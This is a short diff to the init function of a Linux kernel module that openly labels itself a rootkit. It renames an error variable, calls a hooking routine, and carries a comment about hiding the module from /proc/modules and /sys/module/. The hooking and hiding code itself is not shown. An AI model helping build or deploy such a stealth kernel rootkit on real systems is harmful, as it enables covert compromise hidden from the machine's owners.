@@ -14,16 +14,16 @@ MODULE_VERSION("0.1");
 
 static int __init rootkit_init(void)
 {
-    int i_err;
+    int i32_err;
 
     pr_info("[ROOTKIT] Module loading...\n");
 
     // Initialize hooking
-    i_err = init_hooking();
+    i32_err = init_hooking();
 
-    IF_U (i_err != 0) {
+    IF_U (i32_err != 0) {
         pr_err("[ROOTKIT] Failed to initialize hooking\n");
-        return i_err;
+        return i32_err;
     }
 
     // Hide the rootkit from /proc/modules and /sys/module/
